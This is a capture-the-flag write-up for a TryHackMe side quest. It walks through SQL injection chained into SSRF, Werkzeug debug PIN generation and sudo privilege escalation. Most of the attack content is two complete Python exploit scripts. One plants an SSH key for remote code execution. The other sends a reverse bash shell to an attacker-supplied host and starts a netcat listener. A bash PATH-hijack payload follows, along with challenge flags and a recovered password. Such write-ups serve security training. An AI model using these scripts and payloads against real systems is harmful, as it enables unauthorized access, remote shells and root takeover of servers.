# The Bandit Surfer

This SideQuest can be found here: https://tryhackme.com/jr/surfingyetiiscomingtotown

## 1. What is the user flag?

Starting with a port scan, we find port 22 and 8000 open:  
![image](https://github-production-user-asset-6210df.s3.amazonaws.com/80063008/292662785-95a94bb0-2d32-40a8-83f2-82d1b3447de3.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20231228%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20231228T092115Z&X-Amz-Expires=300&X-Amz-Signature=8cccfd3f81e5e393e2789b37c2f150b484f799aa808dacb484cc7f79c79fa75f&X-Amz-SignedHeaders=host&actor_id=80063008&key_id=0&repo_id=600841946)

On port 8000 we get a very cute looking website from which we can download images:  
![image](https://github-production-user-asset-6210df.s3.amazonaws.com/80063008/292662800-d26846b7-2b5b-41bf-b39f-962c4de27862.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20231228%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20231228T092122Z&X-Amz-Expires=300&X-Amz-Signature=77a9f335d3349e1fc6de33099085802d45b56fca2d9b8fad8a20324d47645b51&X-Amz-SignedHeaders=host&actor_id=80063008&key_id=0&repo_id=600841946)

This is done by passing an integer in the id parameter on the /download endpoint. Also, in the response we can see this is a Werkzeug website:  
![image](https://github-production-user-asset-6210df.s3.amazonaws.com/80063008/292662811-9b0c0432-6b35-4784-bceb-7f877a659274.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20231228%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20231228T092132Z&X-Amz-Expires=300&X-Amz-Signature=71e69067229349e2e9bf0339fcf8bee5252ac16f4772f32a1e2ea06e861278e2&X-Amz-SignedHeaders=host&actor_id=80063008&key_id=0&repo_id=600841946)

We see that the /console is accessible so Debug is enabled:  
![image](https://github-production-user-asset-6210df.s3.amazonaws.com/80063008/292662843-005e964b-ca51-4bfe-a76d-1c45fc9d3859.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20231228%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20231228T092141Z&X-Amz-Expires=300&X-Amz-Signature=409abe293130e4d32f356356666a581a0160e6e43b7d36db0505910409e8e833&X-Amz-SignedHeaders=host&actor_id=80063008&key_id=0&repo_id=600841946)

Including a single quote in the id parameter outputs a MySQL error which indicates the possibility of some SQL injection:  
![image](https://github-production-user-asset-6210df.s3.amazonaws.com/80063008/292662899-d651479b-f197-4fac-820f-2be355d7e49b.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20231228%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20231228T092150Z&X-Amz-Expires=300&X-Amz-Signature=07026b73edb96493a84e787ac7fa5e564e6e47aeb8f36449dffd548e88f3f944&X-Amz-SignedHeaders=host&actor_id=80063008&key_id=0&repo_id=600841946)

Because Debug is on and the error output is verbose, we can also see the location where the application is running from:  
![image](https://github-production-user-asset-6210df.s3.amazonaws.com/80063008/292662920-6d86c149-a6c2-4ca3-a656-2bfb6ddb4e58.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20231228%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20231228T092159Z&X-Amz-Expires=300&X-Amz-Signature=bbd2cc5fcbae8e0df32e9e9b1cc6661190354f572dac63305738880c7efd2255&X-Amz-SignedHeaders=host&actor_id=80063008&key_id=0&repo_id=600841946)

Dumping the database with SQLMap doesn't yield anything useful:  
![image](https://github-production-user-asset-6210df.s3.amazonaws.com/80063008/292662945-5029a8cb-5d0d-4720-b5ae-01bfd6d1c36f.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20231228%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20231228T092208Z&X-Amz-Expires=300&X-Amz-Signature=0c7b37740af69b11f606ce1de06b1b58eb37ca7fa128323736eb7eba94bffaa3&X-Amz-SignedHeaders=host&actor_id=80063008&key_id=0&repo_id=600841946)

However, manual checks seem to indicate that whatever output our SQL injection does, is passed to pycurl and trying to be accessed:  

![image](https://github-production-user-asset-6210df.s3.amazonaws.com/80063008/292662965-ccb6f155-2b09-4e7f-aa2e-75f1cb2b5ab6.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20231228%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20231228T092218Z&X-Amz-Expires=300&X-Amz-Signature=59580f881264d63125410357ebdaef9c5b8b3e82ed4832b31e3f3f39feb66ed5&X-Amz-SignedHeaders=host&actor_id=80063008&key_id=0&repo_id=600841946)

Because the version of the database from the picture above isn't a valid host, of course the error indicates that. But this means that we should be able to get the curl to access something we want thus combining the SQLi with an SSRF. A MySQL statement that we can use to output specific text would be this:  

```sql
'UNION SELECT 'file:///etc/passwd' AS output_text;-- -
```

![image](https://github-production-user-asset-6210df.s3.amazonaws.com/80063008/292663077-13c6849e-b5e2-439a-8978-604492500a93.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20231228%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20231228T092225Z&X-Amz-Expires=300&X-Amz-Signature=ec18f5ced7c35fba54e9a0bc97bbefcd567eb4bd8fe58b6aa4df3cd03945f084&X-Amz-SignedHeaders=host&actor_id=80063008&key_id=0&repo_id=600841946)

This way we have confirmed that we can abuse the SQLi to get SSRF and read files. As it is already [known](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug), if Debug is enabled and the /console is accessible, and you have a way to read files from the host, you could generate the required PIN and then execute python code. I have developed this script to get me a foothold directly:  

```python3
import hashlib
from itertools import chain
import requests
from bs4 import BeautifulSoup
import sys, os
from Crypto.PublicKey import RSA
import urllib.parse


if len(sys.argv) <= 1:
    print(f'USAGE: python3 {sys.argv[0]} <IP>')
    exit(1)

ip = str(sys.argv[1])

def create_SSH_keypair():
        key = RSA.generate(2048, os.urandom)
        private_key = key.exportKey('PEM')
        pub_key = key.publickey().exportKey('OpenSSH')

        with open('sshkey', 'wb') as fp:
                fp.write(private_key)

        with open('sshkey.pub', 'wb') as fp:
                fp.write(pub_key)

        os.chmod('sshkey', 0o600)
        return pub_key.decode()
print('[+] creating SSH keypair')
public_key = create_SSH_keypair()

probably_public_bits = [
        'mcskidy',# username
        'flask.app',# modname
        'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
        '/home/mcskidy/.local/lib/python3.8/site-packages/flask/app.py' # getattr(mod, '__file__', None),
]

mac_url = f'http://{ip}:8000/download?id=\'+UNION+SELECT+\'file:///sys/class/net/eth0/address\'+AS+output_text%3b--+-'
machine_url = f'http://{ip}:8000/download?id=\'+UNION+SELECT+\'file:///etc/machine-id\'+AS+output_text%3b--+-'
print('[+] trying to get public and private bits')
try:
        r = requests.get(mac_url)
        mac_address = str(r.text.strip())
        getnode = int(mac_address.strip().replace(':', ''), base=16)
        m = requests.get(machine_url)
except:
        print('[-] try again!')

private_bits = [
        str(getnode),# str(uuid.getnode()),  /sys/class/net/eth0/address
        str(m.text.strip())# get_machine_id(), /etc/machine-id, /proc/sys/kernel/random/boot_id, or /proc/self/cgroup
]

h = hashlib.sha1() #test with md5 and sha1
for bit in chain(probably_public_bits, private_bits):
        if not bit:
                continue
        if isinstance(bit, str):
                bit = bit.encode('utf-8')
        h.update(bit)
h.update(b'cookiesalt')
#h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
        h.update(b'pinsalt')
        num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
        for group_size in 5, 4, 3:
                if len(num) % group_size == 0:
                        rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                                                  for x in range(0, len(num), group_size))
                        break
        else:
                rv = num

print('[+] generating Werkzeug PIN')

secret = f'http://{ip}:8000/console'
s = requests.get(secret)
html_response = s.text
soup = BeautifulSoup(html_response, 'html.parser')
script_tag = soup.find_all('script')
script_content = script_tag[1].string
secret_start = script_content.find('SECRET = "')
secret_end = script_content.find('";', secret_start)
secret_value = script_content[secret_start + len('SECRET = "'):secret_end]

print('[+] grabbing Werkzeug secret')

console_url = f'http://{ip}:8000/console?__debugger__=yes&cmd=pinauth&pin={rv}&s={secret_value}'

try:
        c = requests.get(console_url)
        headers = c.headers
        cookie = headers['Set-Cookie'][:-35]
        cookie_key = cookie.split('=')[0]
        cookie_value = cookie.split('=')[1]
        print('[+] sending RCE')
        foothold = f'http://{ip}:8000/console?&__debugger__=yes&cmd=with%20open(%27/home/mcskidy/.ssh/authorized_keys%27,%27w%27)%20as%20fp:fp.write(%27{urllib.parse.quote(public_key)}%27)&frm=0&s={secret_value}'
        cookie_to_auth = {cookie_key:cookie_value}
        cookie_to_auth = {cookie_key:cookie_value}
        requests.get(foothold, cookies=cookie_to_auth)
        os.system(f'ssh -i sshkey -o StrictHostKeyChecking=no mcskidy@{ip}')
except:
        print('failed to generate correct PIN, reset machine')
```
After we run the script with the IP of the generated machine, we easily get an SSH connection to the mcskidy user and get the first flag:  
![image](https://github-production-user-asset-6210df.s3.amazonaws.com/80063008/292663202-faaf3dd2-92df-4437-afd2-76b7a4262810.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20231228%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20231228T092238Z&X-Amz-Expires=300&X-Amz-Signature=1c406c33f66d15ae8954ac2130716b2e80788f820880612638f267de8f523273&X-Amz-SignedHeaders=host&actor_id=80063008&key_id=0&repo_id=600841946)

![image](https://github-production-user-asset-6210df.s3.amazonaws.com/80063008/292663212-803694dc-ee34-4612-bf41-cfc987c056a4.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20231228%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20231228T092245Z&X-Amz-Expires=300&X-Amz-Signature=a97805b73e0605f14ea10158161355dfc74a75132e801416411e2e54c2ea04d5&X-Amz-SignedHeaders=host&actor_id=80063008&key_id=0&repo_id=600841946)

`THM{SQli_SsRF_2_WeRkZeuG_PiN_ExPloit}`

Or, if you prefer to get a netcat shell, you can also do a script similar to this:

```python3
import hashlib
from itertools import chain
import requests
from bs4 import BeautifulSoup
import sys, time
from socket import socket, AF_INET, SOCK_STREAM
from threading import Thread
import subprocess

ip = str(sys.argv[1])
revip = str(sys.argv[2])
revport = int(sys.argv[3])

probably_public_bits = [
        'mcskidy',# username
        'flask.app',# modname
        'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
        '/home/mcskidy/.local/lib/python3.8/site-packages/flask/app.py' # getattr(mod, '__file__', None),
]

mac_url = f'http://{ip}:8000/download?id=\'+UNION+SELECT+\'file:///sys/class/net/eth0/address\'+AS+output_text%3b--+-'
try:
        r = requests.get(mac_url)
        mac_address = str(r.text.strip())
        getnode = int(mac_address.strip().replace(':', ''), base=16)
except:
        print('Try again!')


machine_url = f'http://{ip}:8000/download?id=\'+UNION+SELECT+\'file:///etc/machine-id\'+AS+output_text%3b--+-'
m = requests.get(machine_url)

private_bits = [
        str(getnode),# str(uuid.getnode()),  /sys/class/net/eth0/address
        str(m.text.strip())# get_machine_id(), /etc/machine-id, /proc/sys/kernel/random/boot_id, or /proc/self/cgroup
]

h = hashlib.sha1() #test with md5 and sha1
for bit in chain(probably_public_bits, private_bits):
        if not bit:
                continue
        if isinstance(bit, str):
                bit = bit.encode('utf-8')
        h.update(bit)
h.update(b'cookiesalt')
#h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
        h.update(b'pinsalt')
        num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
        for group_size in 5, 4, 3:
                if len(num) % group_size == 0:
                        rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                                                  for x in range(0, len(num), group_size))
                        break
        else:
                rv = num

# print(rv)

secret = f'http://{ip}:8000/console'
s = requests.get(secret)
html_response = s.text
soup = BeautifulSoup(html_response, 'html.parser')
script_tag = soup.find_all('script')
script_content = script_tag[1].string
secret_start = script_content.find('SECRET = "')
secret_end = script_content.find('";', secret_start)
secret_value = script_content[secret_start + len('SECRET = "'):secret_end]

def listener(port):
    subprocess.call(['nc', '-lvnp', f'{revport}'])

def foothold(revip, revport):
        global secret_value, rv, ip
        console_url = f'http://{ip}:8000/console?__debugger__=yes&cmd=pinauth&pin={rv}&s={secret_value}'
        try:
                c = requests.get(console_url)
                headers = c.headers
                cookie = headers['Set-Cookie'][:-35]
                cookie_key = cookie.split('=')[0]
                cookie_value = cookie.split('=')[1]
                proxy = {"http":"http://127.0.0.1:8080"}
                foothold = f'http://{ip}:8000/console?&__debugger__=yes&cmd=import%20socket%2C%20subprocess%2C%20os%2C%20time%3B%20s%3Dsocket.socket(socket.AF_INET%2Csocket.SOCK_STREAM)%3B%20s.connect((%22{revip}%22%2C{revport}))%3B%20os.dup2(s.fileno()%2C0)%3B%20os.dup2(s.fileno()%2C1)%3Bos.dup2(s.fileno()%2C2)%3Bp%3Dsubprocess.call(%5B%22%2Fbin%2Fbash%22%2C%22-i%22%5D)&frm=0&s={secret_value}'
                cookie_to_auth = {cookie_key:cookie_value}
                requests.get(foothold, cookies=cookie_to_auth, proxies=proxy)
                
        except:
                print('failed to generate correct PIN, reset machine')

t1 = Thread(target=listener, args=(revport,))
t2 = Thread(target=foothold, args=(revip, revport))
t1.start()
t2.start()
```

![image](https://i.imgur.com/dO9u4Mx.png)

## 2. What is the root flag?

Another enumeration phase begins so we first look at the app and see what we can learn from it. Going into the app directory, we find that it contains a git repo:  
![image](https://github-production-user-asset-6210df.s3.amazonaws.com/80063008/292663243-236794e5-e776-4f1c-b699-d64e3d0a2b60.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20231228%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20231228T092257Z&X-Amz-Expires=300&X-Amz-Signature=c4e7f969c9a1b06df1b2e95fa44d1ef003a9069aa8d531e3da043efef16261d4&X-Amz-SignedHeaders=host&actor_id=80063008&key_id=0&repo_id=600841946)

Enumerating the git commits, we find a password in one of them which works for our user:  
![image](https://github-production-user-asset-6210df.s3.amazonaws.com/80063008/292663251-753e0caf-728d-42f5-8562-f27b0ee64f8e.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20231228%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20231228T092313Z&X-Amz-Expires=300&X-Amz-Signature=70adf71ebdde3f5c1e957e6cfe8d115d9f597b77b163d17d44ed74ec3b63b836&X-Amz-SignedHeaders=host&actor_id=80063008&key_id=0&repo_id=600841946)

`F453TgvhALjZ`

Checking the sudo privileges now that we have the password, we find that the user can run a specific bash script as root:  
![image](https://github-production-user-asset-6210df.s3.amazonaws.com/80063008/292663281-b5c68fb3-827a-4c69-a4dd-4df60adae238.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20231228%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20231228T092324Z&X-Amz-Expires=300&X-Amz-Signature=d56d580f5eb98ca6c3b6f0ad7cc7bead6c1cd57e5c616b309a27d3c4dd37a850&X-Amz-SignedHeaders=host&actor_id=80063008&key_id=0&repo_id=600841946)

This is the content of said script:  

```bash
#!/bin/bash
. /opt/.bashrc
cd /home/mcskidy/

WEBSITE_URL="http://127.0.0.1:8000"

response=$(/usr/bin/curl -s -o /dev/null -w "%{http_code}" $WEBSITE_URL)

# Check the HTTP response code
if [ "$response" == "200" ]; then
  /usr/bin/echo "Website is running: $WEBSITE_URL"
else
  /usr/bin/echo "Website is not running: $WEBSITE_URL"
fi
```

I stared at this for a long while trying to find the vulnerability. I tried PATH highjacking, symlinks, Environment variable highjacks etc. This one started to bug me but I was saved by a nudge in the right [direction](https://github.com/carlospolop/hacktricks/blob/master/linux-hardening/useful-linux-commands/bypass-bash-restrictions.md). I started reading this and when I saw the builtins section, specifically that you can disable "[" as builtin and enable it as script, I immediately knew that that was my solution.

```bash
enable -n [
echo -e '#!/bin/bash\ncp /home/mcskidy/.ssh/authorized_keys /root/.ssh/authorized_keys;echo done' > [
chmod +x [
export PATH=/home/mcskidy/:$PATH
```

My python foothold script already writes an SSH key into McSkidy's folder, so I just copy that into the root folder. After disabling the "[" as builtin, we create a file with our privilege escalation vector and make it executable and make sure our PATH includes the location where we have it. Then we run the /opt/check.sh as root and SSH in.  

![image](https://github-production-user-asset-6210df.s3.amazonaws.com/80063008/292663513-1cd68f60-76c2-4536-9be2-bed3983ecd40.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20231228%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20231228T092336Z&X-Amz-Expires=300&X-Amz-Signature=2b7395ee69aa2f534b583a09c8eb442610ea0fb0fddf93d960e643803d6f3665&X-Amz-SignedHeaders=host&actor_id=80063008&key_id=0&repo_id=600841946)

`THM{BaNDiT_YeTi_Lik3s_PATH_HijacKing}`

## 3. What is the yetikey4.txt flag?

`4-3f$FEBwD6AoqnyLjJ!!Hk4tc*V6w$UuK#evLWkBp`
